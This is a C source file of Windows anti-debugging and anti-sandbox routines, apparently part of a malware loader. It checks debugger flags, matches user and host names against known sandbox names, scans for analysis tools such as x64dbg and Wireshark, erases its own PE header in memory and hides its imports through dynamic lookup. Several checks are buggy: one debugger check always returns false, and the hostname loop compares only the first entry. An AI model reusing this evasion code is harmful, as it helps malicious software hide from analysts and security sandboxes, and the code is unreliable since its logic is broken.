#pragma once
#include "headers.h"

BOOL IsDebuggedPEB() {

	PPEB ppeb{};

#ifdef	_WIN64
	ppeb = (PPEB)__readgsqword(0x60);

#elif _WIN32
	ppeb = (PPEB)__readfsdword(0x30);  

#endif
	return (ppeb->BeingDebugged == 1 ) ? TRUE : FALSE;

}

typedef BOOL (WINAPI* _IsDebuggerPresent)(VOID);
BOOL IsDebugged() {

	_IsDebuggerPresent C_IsDebuggerPresent = 
		(_IsDebuggerPresent)C_GetProcAddr(C_GetModuleHandle(wstrkernel32), strIsDebuggerPresent);

	BOOL res = FALSE;

	BOOL debug = C_IsDebuggerPresent();
	switch (debug) {

	case TRUE:
		res = TRUE;
	case FALSE:
		res = FALSE;

	}

	return res;
}

typedef BOOL (WINAPI* _CheckRemoteDebuggerPresent)(
	_In_ HANDLE hProcess,
	_Out_ PBOOL pbDebuggerPresent
);

BOOL IsRemoteDebuggerPresent() {

	_CheckRemoteDebuggerPresent C_CheckRemoteDebuggerPresent = 
		(_CheckRemoteDebuggerPresent)C_GetProcAddr(C_GetModuleHandle(wstrkernel32), strCheckRemoteDebuggerPresent);

	BOOL res = FALSE;

	BOOL pbDebuggerPresent = FALSE;
	BOOL bRemoteDebug = C_CheckRemoteDebuggerPresent((HANDLE)-1, &pbDebuggerPresent);
	if (pbDebuggerPresent == TRUE) {
		res = TRUE;
	}

	return res;
}

typedef BOOL (WINAPI* _GetUserNameA)(
	_Out_writes_to_opt_(*pcbBuffer, *pcbBuffer) LPSTR lpBuffer,
	_Inout_ LPDWORD pcbBuffer
);

BOOL VMUserCheck() {

	t_LoadLibraryW C_LoadLibraryW = (t_LoadLibraryW)C_GetProcAddr(C_GetModuleHandle(wstrkernel32), strLoadLibraryW);

	HMODULE hAdvapi32 = C_LoadLibraryW(wstradvapi32dll);

	_GetUserNameA C_GetUserNameA =
		(_GetUserNameA)C_GetProcAddr(C_GetModuleHandle(wstradvapi32dll), strGetUserNameA);

	BOOL res = FALSE;
	
	const char* szUsernames[] = {

		"CurrentUser",
		"Sand box",
		"Emily",
		"HAPUBWS",
		"Hong Lee",
		"IT-ADMIN",
		"Johnson",
		"Miller",
		"milozs",
		"Peter Wilson",
		"timmy",
		"user",
		"sandbox",
		"malware",
		"maltest",
		"test user",
		"virus",
		"John Doe",
		"WDAGUtilityAccount",
	};
		
	char currentUser[MAX_PATH];
	DWORD dwCurrentUser = MAX_PATH;

	BOOL getUser = C_GetUserNameA((LPSTR)&currentUser, &dwCurrentUser);
	if (getUser == FALSE) return res;

	WORD dwLength = sizeof(szUsernames) / sizeof(szUsernames[0]);
	for (int i = 0; i < dwLength; i++) {
		if (lstrcmpiA(szUsernames[i], currentUser) == 0) {
			printf("[CHECK] Found a sandbox user \t( %s )\n", szUsernames[i]);
			res = TRUE;
		}
	}

	
	t_FreeLibrary C_FreeLibrary = (t_FreeLibrary)C_GetProcAddr(C_GetModuleHandle(wstrkernel32), strFreeLibrary);
	C_FreeLibrary(hAdvapi32);

	return res;
}

typedef BOOL (WINAPI* _GetComputerNameA)(
	_Out_writes_to_opt_(*nSize, *nSize + 1) LPSTR lpBuffer,
	_Inout_ LPDWORD nSize
);

BOOL VMHostnameCheck() {

	_GetComputerNameA C_GetComputerNameA =
		(_GetComputerNameA)C_GetProcAddr(C_GetModuleHandle(wstrkernel32), strGetComputerNameA);

	BOOL res = FALSE;

	const char* szHostnames[] = {
		"SANDBOX",
		"7SILVIA",
		"HANSPETER-PC",
		"JOHN-PC",
		"MUELLER-PC",
		"WIN7-TRAPS",
		"FORTINET",
		"TEQUILABOOMBOOM"
	};

	char currentHostname[MAX_PATH];
	DWORD dwCurrentHostname = MAX_PATH;

	if (C_GetComputerNameA((LPSTR)&currentHostname, &dwCurrentHostname) == FALSE) {
		return EXIT_FAILURE;
	};

	WORD dwLength = sizeof(szHostnames) / sizeof(szHostnames[0]);

	for (int i = 0; i < dwLength; i++) {
		if (lstrcmpiA(szHostnames[0], currentHostname) == 0) {
			printf("[CHECK] Running in sandbox environment \t( %s )\n", szHostnames[0]);
			res = TRUE;
		}
	}

	return res;
}


typedef BOOL(WINAPI* _VirtualProtect)(
	_In_  LPVOID lpAddress,
	_In_  SIZE_T dwSize,
	_In_  DWORD flNewProtect,
	_Out_ PDWORD lpflOldProtect
);

VOID ErasePEHeaderFromMemory() {

	_VirtualProtect C_VirtualProtect =
		(_VirtualProtect)C_GetProcAddr(C_GetModuleHandle(wstrkernel32), strVirtualProtect);

	printf("[*] Erasing PE header from memory\n");
	DWORD OldProtect = 0;

	char* pBaseAddr = (char*)C_GetModuleHandle(NULL);

	C_VirtualProtect(pBaseAddr, 4096, PAGE_READWRITE, &OldProtect);

	RtlSecureZeroMemory(pBaseAddr, 4096);
}

typedef BOOL (WINAPI* t_WTSEnumerateProcessesW)(
	IN HANDLE hServer,
	IN DWORD Reserved,
	IN DWORD Version,
	OUT PWTS_PROCESS_INFOW* ppProcessInfo,
	OUT DWORD* pCount
);

typedef BOOL (WINAPI* t_WTSEnumerateProcessesA)(
	IN HANDLE hServer,
	IN DWORD Reserved,
	IN DWORD Version,
	OUT PWTS_PROCESS_INFOA* ppProcessInfo,
	OUT DWORD* pCount
);

#ifdef UNICODE
#define WTSEnumerateProcesses WTSEnumerateProcessesW
#else
#define WTSEnumerateProcesses WTSEnumerateProcessesA
#endif

INT analysis_tools_process() {

	t_LoadLibraryW C_LoadLibraryW = (t_LoadLibraryW)C_GetProcAddr(C_GetModuleHandle(wstrkernel32), strLoadLibraryW);
	t_FreeLibrary C_FreeLibrary = (t_FreeLibrary)C_GetProcAddr(C_GetModuleHandle(wstrkernel32), strFreeLibrary);

	HMODULE hWtsApi32 = C_LoadLibraryW(wstrWtsApi32dll);

	int res = 0;

	const char* szProcesses[] = {
		"ollydbg.exe",			
		"ProcessHacker.exe",
		"tcpview.exe",		
		"autoruns.exe",		
		"autorunsc.exe",	
		"filemon.exe",		
		"procmon.exe",		
		"regmon.exe",		
		"procexp.exe",		
		"idaq.exe",			
		"idaq64.exe",		
		"ImmunityDebugger.exe",
		"Wireshark.exe",	
		"dumpcap.exe",		
		"HookExplorer.exe",	
		"ImportREC.exe",	
		"PETools.exe",		
		"LordPE.exe",		
		"SysInspector.exe",	
		"proc_analyzer.exe",
		"sysAnalyzer.exe",	
		"sniff_hit.exe",	
		"windbg.exe",		
		"joeboxcontrol.exe",
		"joeboxserver.exe",	
		"joeboxserver.exe",	
		"ResourceHacker.exe",
		"x32dbg.exe",		
		"x64dbg.exe",		
		"Fiddler.exe",		
		"httpdebugger.exe",	
		"apimonitor-x64.exe",
		"apimonitor-x86.exe",
	};

	DWORD iLength = sizeof(szProcesses) / sizeof(szProcesses[0]);
	
	printf("[*] Checking for malware analysis tools\n");

	WTS_PROCESS_INFOA* wtsinfo;
	DWORD pCount = 0;

	t_WTSEnumerateProcessesA C_WTSEnumerateProcessesA =
		(t_WTSEnumerateProcessesA)C_GetProcAddr(C_GetModuleHandle(wstrWtsApi32dll), strwtsEnumProc);

	if (C_WTSEnumerateProcessesA((HANDLE)NULL, 0, 1, &wtsinfo, &pCount)) {

		for (DWORD i = 0; i < pCount; i++) {
			for (DWORD o = 0; o < iLength; o++) {
				if (lstrcmpiA(szProcesses[o], wtsinfo[i].pProcessName) == 0) {
					res = 1;
					break;
				}
			}
		}
	}

	return res;

}